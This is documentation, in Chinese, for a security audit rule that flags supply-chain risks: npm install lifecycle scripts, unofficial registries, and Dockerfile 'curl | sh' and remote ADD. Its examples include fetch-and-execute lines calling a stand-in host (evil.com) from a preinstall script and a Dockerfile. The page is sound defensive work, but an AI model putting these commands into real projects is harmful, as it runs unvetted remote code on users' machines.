# Supply Chain Audit

| 属性 | 值 |
|------|-----|
| Rule ID | `supply-chain-audit` |
| 全名 | Supply Chain Audit |
| 维度 | 供应链安全 |
| 默认严重程度 | 🔴 danger / 🟡 warn |

## 检测什么

检测包管理和容器构建中的供应链攻击风险：install 生命周期脚本、自定义 registry、Dockerfile 中的远程获取和执行。

## 为什么危险

供应链攻击通过构建和安装过程中的自动化环节植入恶意代码：

- `postinstall` 脚本在 `npm install` 时自动执行，用户通常不会审查
- 自定义 registry 可能提供被篡改的包版本
- Dockerfile 中的 `curl | sh` 在构建时执行远程脚本，无法审计
- `ADD https://` 从远程拉取未经验证的文件

## 子规则详细说明

### `supply-chain-audit/install-script` — 生命周期脚本 🟡

检测 package.json 中的以下自动执行脚本：

- `preinstall` — 安装前执行
- `postinstall` — 安装后执行
- `preuninstall` — 卸载前执行
- `postuninstall` — 卸载后执行
- `prepare` — 打包和发布前执行

```json
{
  "scripts": {
    "postinstall": "node setup.js",
    "preinstall": "curl https://evil.com/init.sh | bash"
  }
}
```

### `supply-chain-audit/custom-registry` — 自定义 Registry 🟡

检测 package.json 的 `publishConfig.registry` 和 `.npmrc` 中配置的非官方 registry。

官方 registry 白名单：
- `https://registry.npmjs.org`
- `https://registry.yarnpkg.com`

```json
// package.json
{
  "publishConfig": {
    "registry": "https://evil-registry.com/"
  }
}
```

```ini
# .npmrc
registry = https://suspicious-registry.com/
```

### `supply-chain-audit/pipe-to-shell` — Dockerfile 远程脚本执行 🔴

检测 Dockerfile 中 `curl | sh`、`wget | bash` 等远程脚本执行模式。

```dockerfile
RUN curl -sSL https://example.com/install.sh | bash
RUN wget -qO- https://evil.com/setup | sh
```

### `supply-chain-audit/remote-add` — Dockerfile 远程 ADD 🟡

检测 Dockerfile 中 `ADD https://` 从远程 URL 拉取文件。

```dockerfile
ADD https://example.com/binary /usr/local/bin/app
```

应使用 `COPY` 配合本地已验证的文件替代。

## 真实案例 / 攻击场景

1. **eslint-scope 事件**（2018）：攻击者通过被盗的 npm 账号发布恶意版本，`postinstall` 脚本窃取用户的 npm token
2. **ua-parser-js 劫持**（2021）：`preinstall` 脚本下载并执行加密货币挖矿程序
3. **Codecov 供应链攻击**（2021）：攻击者修改了 Codecov 的 bash uploader 脚本（通过 `curl | bash` 安装），窃取 CI 环境中的凭证和源码
4. **Dependency Confusion**：攻击者在公共 registry 发布与内部包同名的包，利用 `--extra-index-url` 优先级劫持安装

## 修复建议

| 子规则 | 建议 |
|--------|------|
| `install-script` | 审查所有生命周期脚本内容。如非必要，移除 `postinstall` 等脚本。使用 `--ignore-scripts` 安装 |
| `custom-registry` | 验证 registry URL 的合法性。企业内部 registry 应通过安全通道配置 |
| `pipe-to-shell` | 先下载脚本，验证校验和（SHA256），再执行。使用多阶段构建 |
| `remote-add` | 使用 `COPY` 替代 `ADD`。先下载文件到本地并验证完整性 |

## 误报说明

- **合法的 postinstall**：某些包（如 `esbuild`、`sharp`）需要 postinstall 下载平台特定的二进制文件
- **企业内部 registry**：公司内部的 npm registry 是合法配置
- **官方安装脚本**：某些工具的官方安装方式确实是 `curl | bash`（如 Rust 的 rustup）

### 如何忽略

在 `.skill-audit-ignore` 文件中配置：

```
supply-chain-audit/install-script:package.json
supply-chain-audit/custom-registry:.npmrc
```
